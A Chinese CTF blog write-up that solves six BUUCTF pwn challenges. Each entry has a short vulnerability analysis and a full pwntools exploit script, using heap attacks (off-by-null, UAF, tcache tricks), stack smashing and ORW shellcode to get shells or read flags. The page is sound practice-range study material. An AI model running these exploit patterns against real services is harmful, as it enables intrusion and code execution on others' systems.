<!DOCTYPE html>
<html lang="zh-CN">





<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="description" content>
  <meta name="author" content="chumen77">
  <meta name="keywords" content>
  <title>BUUCTF 刷题记录 ~ Chumen77&#39;s Blog</title>

  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css">
<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">


  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">

<link rel="stylesheet" href="/css/main.css">


  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">


</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Chumen77's Blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">首页</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">归档</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">标签</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">关于</a>
          </li>
        
          
          
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" false
         style="background: url('/img/default.png')no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              <br>
              
                <p class="mt-3">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
                  星期一, 九月 28日 2020, 7:24 晚上
                </p>
              

              <p>
                
                  
                  &nbsp;<i class="far fa-chart-bar"></i>
                  <span class="post-count">
                    9.6k 字
                  </span>&nbsp;
                

                
                  
                  &nbsp;<i class="far fa-clock"></i>
                  <span class="post-count">
                      50 分钟
                  </span>&nbsp;
                

                
                  <!-- 不蒜子统计文章PV -->
                  
                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
                  <span id="busuanzi_container_page_pv">
                    <span id="busuanzi_value_page_pv"></span> 次
                  </span>&nbsp;
                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="py-5 z-depth-3" id="board">
        <div class="post-content mx-auto" id="post">
          <div class="markdown-body">
            <h1 id="BUUCTF刷题记录"><a href="#BUUCTF刷题记录" class="headerlink" title="BUUCTF刷题记录"></a>BUUCTF刷题记录</h1><h2 id="GKCTF-2020-demo"><a href="#GKCTF-2020-demo" class="headerlink" title="GKCTF 2020 demo"></a>GKCTF 2020 demo</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>开启了沙箱，不过在main函数的最后，在while循环里做动作就不会触发到。<br>其中add和free 函数，上来都会检测<code>free_hook malloc_hook</code> 是否不为0，不为0就不让进行相应的操作。</p>
<h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><pre><code class="c"> if ( (nbytes &amp; 0x80000000) == 0LL &amp;&amp; nbytes &lt;= 0x120 )
        {
          heaplist[SHIDWORD(nbytes)] = malloc(nbytes);
          puts(&quot;content:&quot;);
          read(0, heaplist[SHIDWORD(nbytes)], nbytes);
          *(heaplist[SHIDWORD(nbytes)] + nbytes) = 0;// off by null
          ++counts;
        }</code></pre>
<p>Add中存在<code>OFF BY NULL</code>。</p>
<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul>
<li>利用off by null 构造一个堆重叠</li>
<li>泄漏出libc地址</li>
<li>2次释放重叠的chunk，进行fastbin attack <code>malloc_hook_</code>为 one gadget</li>
<li>通过读入choice的scanf函数，传送大量字节，其会调用malloc申请chunk，即可get shell</li>
</ul>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
import time
local_file  = &#39;./domo&#39;
elf = ELF(local_file)
context.log_level = &#39;debug&#39;
debug = 0
if debug:
    io = process(local_file)
    libc = elf.libc
else:
    io = remote(&#39;node3.buuoj.cn&#39;,27019)
    libc = elf.libc
    #libc = ELF(&#39;.&#39;)
context.arch = elf.arch
context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
#,&#39;&#39;splitw&#39;,&#39;-h&#39;
rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
realloc = [0x2,0x4,0x6,0xB,0xC,0xD]
s      = lambda data               :io.send(data) 
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
r      = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
itr     = lambda                    :io.interactive()
def debug():
    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
    gdb.attach(io)
    pause()

&#39;&#39;&#39;
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009
 0005: 0x15 0x03 0x00 0x0000000a  if (A == mprotect) goto 0009
 0006: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0009
 0007: 0x15 0x01 0x00 0xffffd8b6  if (A == 0xffffd8b6) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x00000000  return KILL
&#39;&#39;&#39;

def add(size,data):
    sla(&#39;&gt;&#39;,&#39;1&#39;)
    sla(&#39;size&#39;,str(size))
    sa(&#39;tent&#39;,str(data))
def free(idx):
    sla(&#39;&gt;&#39;,&#39;2&#39;)
    sla(&#39;dex&#39;,str(idx))
def show(idx):
    sla(&#39;&gt;&#39;,&#39;3&#39;)
    sla(&#39;dex&#39;,str(idx))


add(0x80,&#39;1&#39;) 
add(0x68,&#39;1&#39;) 
add(0xf0,&#39;1&#39;)
add(0x10,&#39;1&#39;) 
free(1)
free(0)
data = &#39;\x00&#39;*0x60+p64(0x100)
add(0x68,data)
free(2)

add(0x80,&#39;\x00&#39;)
add(0x68,&#39;\x00&#39;)

add(0xf0,&#39;1&#39;)
add(0x68,&#39;1&#39;)
add(0x18,&#39;1&#39;)

free(2)
free(5)
free(0)
show(4)
r()
libc_base = uu64(r(6)) - 0x3c4b31
info_addr(&#39;libc_base &#39;,libc_base)

malloc_hook=libc_base+libc.symbols[&#39;__malloc_hook&#39;]
realloc_hook=libc_base+libc.symbols[&#39;realloc&#39;]
add(0x68,p64(malloc_hook-0x23))
add(0x68,p64(malloc_hook-0x23))
add(0x68,p64(malloc_hook-0x23))
onegadget = 0x4526a + libc_base

data = &#39;\x00&#39;*0xb+p64(onegadget)+ p64(realloc_hook+realloc[0])
add(0x68,data)
sla(&#39;&gt;&#39;,&#39;1&#39;*500)

# debug()
itr()</code></pre>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><ul>
<li>还可以攻击<code>calloc_hook</code>,因为seccomp里面调用了calloc。</li>
<li>攻击io file 进行泄漏和orw。（先等待复现）<br><a href="https://github.com/Starssgo/pwn_challange/blob/master/domo/exp.py" target="_blank" rel="noopener">https://github.com/Starssgo/pwn_challange/blob/master/domo/exp.py</a></li>
</ul>
<h2 id="gyctf-2020-signin"><a href="#gyctf-2020-signin" class="headerlink" title="gyctf_2020_signin"></a><code>gyctf_2020_signin</code></h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><ul>
<li>uaf，但是存在一个flag位用于检测是否free过</li>
<li>edit只能一次</li>
<li>存在后门函数，其中还会用calloc申请一个chunk,并且只需要<code>0x004040C0</code>处有数值即可触发。</li>
</ul>
<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="calloc-的特性："><a href="#calloc-的特性：" class="headerlink" title="calloc 的特性："></a>calloc 的特性：</h4><ul>
<li>在申请到的chunk上会进行一个置零的操作</li>
<li>不会从tcache bin 中取chunk <h4 id="tcache-的-int-malloc有以下特性："><a href="#tcache-的-int-malloc有以下特性：" class="headerlink" title="tcache 的_int_malloc有以下特性："></a>tcache 的<code>_int_malloc</code>有以下特性：</h4></li>
</ul>
<p>在分配 fastbin 中的 chunk 时，若此chain上还有其他chunk ，则调用<code>tcache_put</code>把它们全部放入 tcache 中(smallbins中也是如此)。</p>
<pre><code class="c">    /* While we&#39;re here, if we see other chunks of the same size,
     stash them in the tcache.  */
      size_t tc_idx = csize2tidx (nb);
      if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)
    {
      mchunkptr tc_victim;
      /* While bin not empty and tcache not full, copy chunks over.  */
      while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count
         &amp;&amp; (pp = *fb) != NULL)
        {
          REMOVE_FB (fb, tc_victim, pp);
          if (tc_victim != 0)
        {
          tcache_put (tc_victim, tc_idx);
    }
        }
    }</code></pre>
<h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul>
<li>申请8个堆， 释放8个堆，最后一个会进入fastbin</li>
<li>edit idx=8 的chunk，改其fd为<code>0x004040C0 - 0x10</code></li>
<li>申请一个chunk，此时会在tcache chain中拿走一个，留出一个空位</li>
<li>调用后门函数，其中calloc会从fastbin中拿出idx=8的chunk，但是由于其特性，会把剩下的fd上地址也当作一个chunk丢进tcache</li>
<li>丢进时是丢在tcache的头部，所以会跟tcache 进行一个link。也就是会在这个fd地址上写下，tcache chain 上其紧挨着的chunk地址。这就造成一个任意地址写。</li>
</ul>
<p>漏洞产生原因也是，libc源码中<code>tcache_put</code>基本没有安全检查。</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python
# encoding: utf-8
from pwn import *
import time
local_file  = &#39;./gyctf_2020_signin&#39;
elf = ELF(local_file)
context.log_level = &#39;debug&#39;
debug = 0
if debug:
    io = process(local_file)
    libc = elf.libc
else:
    io = remote(&#39;node3.buuoj.cn&#39;,27592)
    libc = elf.libc
    #libc = ELF(&#39;.&#39;)
context.arch = elf.arch
context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
#,&#39;&#39;splitw&#39;,&#39;-h&#39;
rce18 = [0x4f2c5,0x4f322,0x10a38c]
realloc = [0x2,0x4,0x6,0xB,0xC,0xD]
arae18 = 0x3ebca0
s      = lambda data               :io.send(data) 
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
r      = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
itr     = lambda                    :io.interactive()
def debug():
    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
    gdb.attach(io)
    pause()

def add(idx):
    sla(&#39;your choice?&#39;,&#39;1&#39;)
    sla(&#39;idx&#39;,str(idx))

def edit(idx,data):
    sla(&#39;your choice?&#39;,&#39;2&#39;)
    sla(&#39;idx&#39;,str(idx))
    s(str(data))

def free(idx):
    sla(&#39;your choice?&#39;,&#39;3&#39;)
    sla(&#39;idx&#39;,str(idx))


for i in range(8):
    add(i)
for i in range(8):
    free(i)


edit(7,p64(0x4040C0-0x10))
add(8)
sla(&#39;your choice?&#39;,&#39;6&#39;)
debug()
itr()</code></pre>
<h3 id="题记"><a href="#题记" class="headerlink" title="题记"></a>题记</h3><p>在做的时候，开始有个想法，malloc申请堆时，会在其返回地址的上方留下size信息，以此来利用。但是在验证后，发现是不会的。</p>
<h2 id="gyctf-2020-document"><a href="#gyctf-2020-document" class="headerlink" title="gyctf_2020_document"></a><code>gyctf_2020_document</code></h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><ul>
<li>存在uaf漏洞</li>
<li>只能申请一个0x20、0x90的堆块，不能进行fastbin进行攻击。</li>
</ul>
<h4 id="person数据结构"><a href="#person数据结构" class="headerlink" title="person数据结构"></a>person数据结构</h4><pre><code>

                    ┌──────────────────────┬────┐              
                    │                      │0x21│              
                    ├─────────────┬────────┴────┤              
                    │             │             │              
                    │   main_heap │    flag     │              
                    ├─────────────┴─────────────┤              
                    │                       0x91│              
                    │─────────────┬─────────────┤              
                    │             │             ├──────▶0x10   
                    │     name    │      sex    │              
                    ├─────────────▼─────────────┤              
                    │                           │              
                    │                           │              
                    │                           │              
                    │                           │              
                    │                           │              
                    │          data             │              
                    │                           │       ┌────┐ 
                    │                           ├──────▶│0x80│ 
                    │                           │       └────┘ 
                    │                           │              
                    │                           │              
                    │                           │              
                    │                           │              
                    └───────────────────────────┘                                                              </code></pre><h3 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul>
<li>释放一个0x90的堆，利用uaf进行泄漏libc</li>
<li>申请2个堆，此时在这个0x90的unsortbin会留下2个0x20的person数据结构的头</li>
<li>edit这个释放的堆，控制其中<code>main_heap</code>的地址，然后进行任意地址写。</li>
</ul>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python
# encoding: utf-8
from pwn import *
import time
local_file  = &#39;./gyctf_2020_document&#39;
elf = ELF(local_file)
context.log_level = &#39;debug&#39;
debug = 0
if debug:
    io = process(local_file)
    libc = elf.libc
else:
    io = remote(&#39;node3.buuoj.cn&#39;,25009)
    libc = elf.libc
    #libc = ELF(&#39;.&#39;)
context.arch = elf.arch
context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
#,&#39;&#39;splitw&#39;,&#39;-h&#39;
rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
rce18 = [0x4f2c5,0x4f322,0x10a38c]
realloc = [0x2,0x4,0x6,0xB,0xC,0xD]
arae18 = 0x3ebca0
s      = lambda data               :io.send(data) 
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
r      = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
itr     = lambda                    :io.interactive()
def debug():
    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
    gdb.attach(io)
    pause()

def add(name,sex,data):
    sla(&#39;choice&#39;,&#39;1&#39;)
    sa(&#39;name&#39;,str(name))
    sa(&#39;sex&#39;,str(sex))
    sa(&#39;infor&#39;,str(data))

def show(idx):
    sla(&#39;choice&#39;,&#39;2&#39;)
    sla(&#39;index&#39;,str(idx))

def edit(idx,sex,data):
    sla(&#39;choice&#39;,&#39;3&#39;)
    sla(&#39;dex&#39;,str(idx))
    sa(&#39;sex&#39;,str(sex))
    sa(&#39;infor&#39;,str(data))

def free(idx):
    sla(&#39;choice&#39;,&#39;4&#39;)
    sla(&#39;index&#39;,str(idx))
data = &#39;1&#39; * 0x78
add(&#39;chumen77&#39;,&#39;W&#39;,data)
add(&#39;chumen77&#39;,&#39;W&#39;,data)
free(0)
show(0)
r()
libc_base = uu64(r(6)) - 0x3c4b78
info_addr(&#39;libc_base&#39;,libc_base)
add(&#39;chumen77&#39;,&#39;W&#39;,data)
add(&#39;chumen77&#39;,&#39;W&#39;,data)
free_hook = 0x3c67a8 + libc_base
data = &#39;\x00&#39;* 8 + p64(0x71) + p64(free_hook-0x10) + &#39;\x01&#39; * 0x58
edit(0,&quot;N&quot;,data)
data = p64(libc_base + 0x4526a) + 0x68 * &#39;\x00&#39;
edit(3,&#39;N&#39;,data)
free(0)
itr()</code></pre>
<h2 id="wdb-2018-guess"><a href="#wdb-2018-guess" class="headerlink" title="wdb_2018_guess"></a><code>wdb_2018_guess</code></h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>主要就是利用stack smashing。</p>
<h4 id="stack-smashing"><a href="#stack-smashing" class="headerlink" title="stack smashing"></a>stack smashing</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 <code>__stack_chk_fail</code>函数来打印 <code>argv[0]</code> 指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下</p>
<pre><code class="c">void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail (&quot;stack smashing detected&quot;);
}
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,
                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);
}</code></pre>
<p>所以说如果我们利用栈溢出覆盖 <code>argv[0]</code> 为我们想要输出的字符串的地址，那么在 <strong><code>fortify_fail</code> 函数中就会输出我们想要的信息。</strong></p>
<p>注意其是%s来打印东西的，所以在利用时要用<code>argv[0]</code>做个跳板。</p>
<h5 id="如何获取栈值"><a href="#如何获取栈值" class="headerlink" title="如何获取栈值"></a>如何获取栈值</h5><p><a href="https://blog.csdn.net/chennbnbnb/article/details/104035261" target="_blank" rel="noopener">https://blog.csdn.net/chennbnbnb/article/details/104035261</a></p>
<p>Libc上的<code>_environ</code>存放着当前进程的环境变量，其是一个栈地址。</p>
<p>以此来获取栈值，然后根据偏移来访问栈中的数据。</p>
<h3 id="攻击思路-3"><a href="#攻击思路-3" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul>
<li>获取libc基地址</li>
<li>获取stack地址，根据偏移找到存放flag的stack address</li>
<li>覆盖<code>argv[0]</code>为flag的stack address</li>
</ul>
<p>其中每次都是用gets 覆盖到覆盖<code>argv[0]</code>  ,stack smashing来完成。</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python
# encoding: utf-8
from pwn import *
import time
local_file  = &#39;./GUESS&#39;
elf = ELF(local_file)
context.log_level = &#39;debug&#39;
debug = 0
if debug:
    io = process(local_file)
    libc = elf.libc
else:
    io = remote(&#39;node3.buuoj.cn&#39;,26813)
    libc = elf.libc
    #libc = ELF(&#39;.&#39;)
context.arch = elf.arch
context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
#,&#39;&#39;splitw&#39;,&#39;-h&#39;
s      = lambda data               :io.send(data) 
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
r      = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
itr     = lambda                    :io.interactive()
def debug():
    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
    gdb.attach(io)
    pause()


data = &#39;1&#39; * 0x128 + p64(elf.got[&#39;__libc_start_main&#39;])
sla(&#39;flag&#39;,data)
ru(&#39;hing detected ***: &#39;)
libc_base = uu64(r(6)) - 0x20740
info_addr(&#39;libc_base&#39;,libc_base)

data = &#39;1&#39; * 0x128 + p64(libc.sym[&#39;_environ&#39;] + libc_base)
sla(&#39;flag&#39;,data)
ru(&#39;hing detected ***: &#39;)

stack_flag = uu64(r(6)) - 0x168
info_addr(&#39;stack_base&#39;,stack_flag)
data = &#39;1&#39; * 0x128 + p64(stack_flag)
sla(&#39;flag&#39;,data)
itr()</code></pre>
<h2 id="suctf-2018-basic-pwn"><a href="#suctf-2018-basic-pwn" class="headerlink" title="suctf_2018_basic pwn"></a><code>suctf_2018_basic pwn</code></h2><p>无脑栈溢出</p>
<pre><code class="python">#!/usr/bin/env python
# encoding: utf-8
from pwn import *
import time
local_file  = &#39;./SUCTF_2018_basic_pwn&#39;
elf = ELF(local_file)
context.log_level = &#39;debug&#39;
debug = 0
if debug:
    io = process(local_file)
    libc = elf.libc
else:
    io = remote(&#39;node3.buuoj.cn&#39;,25741)
    libc = elf.libc
    #libc = ELF(&#39;.&#39;)
context.arch = elf.arch
context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
#,&#39;&#39;splitw&#39;,&#39;-h&#39;
rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
rce18 = [0x4f2c5,0x4f322,0x10a38c]
realloc = [0x2,0x4,0x6,0xB,0xC,0xD]
arae18 = 0x3ebca0
s      = lambda data               :io.send(data) 
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
r      = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
itr     = lambda                    :io.interactive()
def debug():
    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
    gdb.attach(io)
    pause()

data = &#39;1&#39; * 0x118 + p64(0x000000401157)
sl(data)
itr()</code></pre>
<h2 id="SWPUCTF-2019-p1KkHeap"><a href="#SWPUCTF-2019-p1KkHeap" class="headerlink" title="SWPUCTF_2019_p1KkHeap"></a><code>SWPUCTF_2019_p1KkHeap</code></h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><ul>
<li>开了沙箱，可以orw拿到flag</li>
<li>功能只能调用18次，free只能3次</li>
<li>free中存在uaf</li>
<li>mmap了一块 rwx的内存在 <code>0x66660000</code></li>
</ul>
<h3 id="攻击思路-4"><a href="#攻击思路-4" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul>
<li>泄漏heap base，准备攻击tcache bin的表头</li>
<li>覆盖bin counts为7，伪造满bin，free chunk，泄漏libc</li>
<li>攻击tcache bin的表头中bin chunk header 的部分，放下<code>0x66660000</code> 和<code>malloc_hook</code>，准备修改这两个部分。</li>
<li>在<code>0x66660000</code>的内存上写下orw的shellcode</li>
<li>攻击<code>malloc_hook</code>为<code>0x66660000</code> 取得flag</li>
</ul>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python
# encoding: utf-8
from pwn import *
import time
local_file  = &#39;./SWPUCTF_2019_p1KkHeap&#39;
elf = ELF(local_file)
context.log_level = &#39;debug&#39;
debug = 0
if debug:
    io = process(local_file)
    libc = elf.libc
else:
    io = remote(&#39;node3.buuoj.cn&#39;,29911)
    libc = elf.libc
    #libc = ELF(&#39;.&#39;)
context.arch = elf.arch
context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
#,&#39;&#39;splitw&#39;,&#39;-h&#39;
s      = lambda data               :io.send(data) 
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
r      = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
itr     = lambda                    :io.interactive()
def debug():
    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
    gdb.attach(io)
    pause()

&#39;&#39;&#39;
================================================================================
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011
 0004: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0011
 0005: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0010
 0006: 0x20 0x00 0x00 0x00000024  A = count &gt;&gt; 32 # write(fd, buf, count)
 0007: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0010
 0008: 0x20 0x00 0x00 0x00000020  A = count # write(fd, buf, count)
 0009: 0x15 0x01 0x00 0x00000010  if (A == 0x10) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
&#39;&#39;&#39;


def add(size):
    sla(&#39;ice&#39;,&#39;1&#39;)
    sla(&#39;size&#39;,str(size))

def show(idx):
    sla(&#39;ice&#39;,&#39;2&#39;)
    sla(&#39;id&#39;,str(idx))

def edit(idx,data):
    sla(&#39;ice&#39;,&#39;3&#39;)
    sla(&#39;id&#39;,str(idx))
    sa(&#39;tent&#39;,str(data))

def free(idx):
    sla(&#39;ice&#39;,&#39;4&#39;)
    sla(&#39;id&#39;,str(idx))



add(0x100) #0
free(0)
free(0)
show(0)
ru(&#39;content: &#39;)
heap_base = uu64(r(6)) - 0x260
info_addr(&#39;heap_base&#39;,heap_base)
add(0x100) #1
edit(1,p64(heap_base+0x10))
add(0x100) #2
add(0x100) #3
debug()
data = p64(8) + &#39;\x07&#39;*8
edit(3,data)
add(0x80)#4
free(0)
show(0)
ru(&#39;content: &#39;)
libc_base = uu64(r(6)) - 0x3ebca0
info_addr(&#39;libc_base&#39;,libc_base)
data = p64(8) + &#39;\x07&#39;*8 + &#39;\x00&#39; * (0xc0 - 0x20) + p64(0x3ebc30 + libc_base) +p64(0x66660000) 
edit(3,data)
add(0x100) #5
orw = shellcraft.open(&#39;flag&#39;)
orw += shellcraft.read(3,0x66660100,0x64)
orw +=shellcraft.write(1,0x66660100,0x64)
edit(5,asm(orw))
add(0xf0) #6
edit(6,p64(0x66660000))
add(1)
itr()</code></pre>
<h3 id="题记-1"><a href="#题记-1" class="headerlink" title="题记"></a>题记</h3><p>在学习别人的exp时，发现还有泄漏libc的另外一种办法，这种办法泄漏出libc，也使得整个exp，基本跟我的不大相同。</p>
<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p><strong>在tcache bin的表头中，其每个大小tcache bin的count(0-7) 是一个无符号类型的数据。</strong></p>
<p>当用uaf漏洞，在一个chain上伪造一个chunk地址，这样当申请后tcache bin的count会变成0xff&gt;0x7，这样利用uaf，再次释放这个chain上 的chunk，就会进入到unsortbin，接着就leak 出libc了。</p>
<pre><code>pwndbg&gt; parseheap
addr                prev                size                 status              fd                bk
0x55daa2e85000      0x0                 0x250                Used                None              None
0x55daa2e85250      0x0                 0x110                Freed     0x7fb70dbbaca0    0x7fb70dbbaca0
0x55daa2e85360      0x110               0x110                Freed     0x55daa2e85370              None
pwndbg&gt; x/30gx 0x55daa2e85000
0x55daa2e85000: 0x0000000000000000      0x0000000000000251
0x55daa2e85010: 0x0000000000000000      0xff00000000000000
0x55daa2e85020: 0x0000000000000000      0x0000000000000000
</code></pre><p>剩下的就是进行tcache dup即可。这个比我那个方法要简单的多。</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://blog.csdn.net/github_36788573/article/details/103475238" target="_blank" rel="noopener">https://blog.csdn.net/github_36788573/article/details/103475238</a></p>
